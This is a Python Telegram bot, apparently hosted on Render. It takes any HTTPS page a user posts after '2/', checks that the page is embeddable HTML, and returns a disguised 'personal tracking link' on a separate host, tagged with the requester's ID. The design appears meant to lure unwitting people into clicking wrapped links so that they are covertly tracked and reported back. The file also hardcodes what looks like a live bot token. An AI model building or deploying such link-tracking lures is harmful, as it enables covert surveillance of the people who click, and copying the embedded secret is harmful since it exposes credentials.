import os
import json
import re
import urllib.parse
import logging
import requests
import threading
from flask import Flask
from telegram import Update
from telegram.ext import Application, MessageHandler, filters, ContextTypes

# === SETUP LOGGING ===
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# === FLASK APP FOR RENDER HEALTH CHECKS ===
app = Flask(__name__)

@app.route('/')
def home():
    return "🤖 Link Tracker Bot is running on Render!"

@app.route('/health')
def health():
    return "OK"

@app.route('/ping')
def ping():
    return "Pong!"

def run_flask_app():
    """Run Flask app in a separate thread for Render health checks"""
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)

# === CONFIGURATION ===
BOT_TOKEN = os.environ.get('BOT_TOKEN', "8307999302:AAGc6sLGoklnbpWsXg76lcdQcVAzGgsp8cQ")

# Render Link
RENDER_LINK = 'https://jsjs-kzua.onrender.com'

# === HELPERS ===
def make_personal_link(chat_id: int, site: str) -> str:
    """Generate a personal tracking link"""
    encoded = urllib.parse.quote(site, safe="")
    return f"{RENDER_LINK}/?chat_id={chat_id}&site={encoded}"

def check_site_embeddable(url: str):
    """Check if a website can be tracked"""
    try:
        if not url.lower().startswith("https://"):
            return False, "Only HTTPS URLs supported"
        
        headers = {"User-Agent": "Mozilla/5.0"}
        resp = requests.head(url, headers=headers, timeout=10, allow_redirects=True)
        if resp.status_code >= 400:
            return False, f"HTTP {resp.status_code}"
        
        content_type = resp.headers.get("content-type", "")
        if "text/html" not in content_type.lower():
            return False, "Not HTML content"
        
        return True, "OK"
    except Exception as e:
        return False, f"Connection error: {e}"

# === MESSAGE HANDLER ===
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle messages containing '2/' followed by a link"""
    
    # Ignore if message is None
    if not update.message or not update.message.text:
        return
    
    text = update.message.text.strip()
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    
    logger.info(f"Received message in chat {chat_id} from user {user_id}: {text}")
    
    # Check if message contains "2/" followed by a URL
    # Pattern: "2/" followed by a valid URL
    pattern = r'2/\s*(https?://[^\s]+)'
    match = re.search(pattern, text, re.IGNORECASE)
    
    if not match:
        # Ignore messages that don't match the pattern
        return
    
    # Extract the URL
    url = match.group(1)
    logger.info(f"Found URL to track: {url}")
    
    # Send processing message
    await update.message.reply_text(f"🌍 Processing link: {url}...")
    
    # Check if site is trackable
    ok, reason = check_site_embeddable(url)
    if not ok:
        await update.message.reply_text(f"❌ Cannot track this link: {reason}")
        return
    
    # Generate personal tracking link
    personal = make_personal_link(user_id, url)
    
    # Send the tracking link
    await update.message.reply_text(
        f"✅ Your tracking link:\n\n{personal}",
        disable_web_page_preview=True
    )

# === ERROR HANDLER ===
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Error: {context.error}")

# === MAIN ===
def main():
    logger.info("🚀 Starting Link Tracker Bot on Render...")
    
    # Start Flask app in background for Render health checks
    flask_thread = threading.Thread(target=run_flask_app, daemon=True)
    flask_thread.start()
    
    # Create bot application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add handler for text messages in groups and private chats
    application.add_handler(MessageHandler(
        filters.TEXT & ~filters.COMMAND, 
        handle_message
    ))
    
    application.add_error_handler(error_handler)
    
    logger.info("🤖 Bot is ready! Using polling mode...")
    logger.info("📌 Bot will respond to messages containing '2/' followed by a link")
    
    # Start polling with error handling
    try:
        application.run_polling(
            drop_pending_updates=True,
            allowed_updates=Update.ALL_TYPES
        )
    except Exception as e:
        logger.error(f"Fatal error: {e}")
        # Restart after delay
        import time
        time.sleep(10)
        main()

if __name__ == "__main__":
    main()
